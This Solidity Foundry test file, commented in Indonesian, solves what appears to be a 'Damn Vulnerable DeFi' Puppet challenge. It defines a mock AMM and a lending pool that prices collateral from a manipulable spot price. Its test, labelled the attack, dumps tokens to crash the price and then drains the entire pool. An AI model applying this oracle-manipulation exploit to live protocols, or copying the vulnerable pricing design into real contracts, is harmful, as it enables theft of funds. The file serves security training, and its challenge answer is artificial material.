// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/DamnValuableToken.sol";

// --- 1. DEFINISI INTERFACE (REMOTE CONTROL) ---
interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

// --- 2. MOCK UNISWAP (SIMPLE AMM) ---
contract SimpleAMM {
    IERC20 public token;
    uint256 public reserveETH;
    uint256 public reserveToken;

    constructor(address _token) payable {
        token = IERC20(_token);
        reserveETH = msg.value;
    }

    function addLiquidity(uint256 tokenAmount) external payable {
        token.transferFrom(msg.sender, address(this), tokenAmount);
        reserveETH += msg.value;
        reserveToken += tokenAmount;
    }

    function getEthOutput(uint256 tokensIn) public view returns (uint256) {
        uint256 amountInWithFee = tokensIn * 997; 
        uint256 numerator = amountInWithFee * reserveETH;
        uint256 denominator = (reserveToken * 1000) + amountInWithFee;
        return numerator / denominator;
    }

    function swapTokenForEth(uint256 tokenAmount) external returns (uint256 ethOutput) {
        ethOutput = getEthOutput(tokenAmount);
        require(address(this).balance >= ethOutput, "Liquidity dry");
        token.transferFrom(msg.sender, address(this), tokenAmount);
        payable(msg.sender).transfer(ethOutput);
        reserveToken += tokenAmount;
        reserveETH -= ethOutput;
    }

    function getSpotPrice() external view returns (uint256) {
        if (reserveToken == 0) return 0;
        return (reserveETH * 1 ether) / reserveToken;
    }
}

// --- 3. TARGET: LENDING POOL ---
contract PuppetPool {
    IERC20 public token;
    SimpleAMM public amm;

    constructor(address _token, address _amm) {
        token = IERC20(_token);
        amm = SimpleAMM(_amm);
    }

    function calculateDepositRequired(uint256 amount) public view returns (uint256) {
        uint256 price = amm.getSpotPrice();
        return (amount * price * 2) / 1 ether;
    }

    function borrow(uint256 amount) external payable {
        uint256 depositRequired = calculateDepositRequired(amount);
        require(msg.value >= depositRequired, "Not enough collateral");
        require(token.balanceOf(address(this)) >= amount, "Not enough liquidity");
        token.transfer(msg.sender, amount);
    }
}

// --- 4. TEST SCRIPT (THE ATTACK) ---

contract PuppetMasterChallenge is Test {
    DamnValuableToken token;
    SimpleAMM amm;
    PuppetPool pool;

    address attacker;
    address deployer;

    function setUp() public {
        attacker = makeAddr("attacker");
        deployer = makeAddr("deployer");

        // Modal untuk Deployer biar gak revert saat setup AMM
        vm.deal(deployer, 100 ether);

        vm.startPrank(deployer);

        token = new DamnValuableToken();

        amm = new SimpleAMM{value: 10 ether}(address(token));
        token.approve(address(amm), 1000 ether); 
        amm.addLiquidity(1000 ether); 

        pool = new PuppetPool(address(token), address(amm));
        token.transfer(address(pool), 1000000 ether);

        // Modal Awal Attacker
        token.transfer(attacker, 1000 ether);
        
        // Modal ETH Attacker: Kita set 6000 ETH 
        // (Cukup untuk bayar jaminan harga diskon yg sekitar 5007 ETH)
        vm.deal(attacker, 6000 ether);

        vm.stopPrank();
    }

    function test_Puppet_Attack() public {
        vm.startPrank(attacker);

        console.log("--- KONDISI AWAL ---");
        console.log("Attacker DVT:", token.balanceOf(attacker) / 1 ether);
        console.log("Attacker ETH:", attacker.balance / 1 ether);
        
        uint256 borrowAmount = 1000000 ether; // Kita mau kuras habis pool
        
        // 1. Approve AMM agar bisa swap
        token.approve(address(amm), type(uint256).max);

        // 2. DUMP! Jual semua token kita ke AMM (Crash Market)
        uint256 myDvt = token.balanceOf(attacker);
        amm.swapTokenForEth(myDvt);

        // 3. Cek Harga & Hitung Jaminan (yang sekarang sudah murah)
        uint256 cheapDeposit = pool.calculateDepositRequired(borrowAmount);
        
        console.log("--- MOMEN KEBENARAN ---");
        console.log("Jaminan Normal Harusnya: 20,000 ETH");
        console.log("Jaminan Diskon Kita  :", cheapDeposit / 1 ether, "ETH");
        
        // 4. Pinjam Duit (Borrow) sampai habis
        pool.borrow{value: cheapDeposit}(borrowAmount);

        console.log("--- HASIL AKHIR ---");
        console.log("Attacker DVT:", token.balanceOf(attacker) / 1 ether);
        console.log("Pool DVT    :", token.balanceOf(address(pool)) / 1 ether);
        
        // VALIDASI: 
        // Pastikan saldo Pool sekarang 0 (Habis tak tersisa)
        assertEq(token.balanceOf(address(pool)), 0, "Pool harusnya kosong melompong!");
        
        vm.stopPrank();
    }
}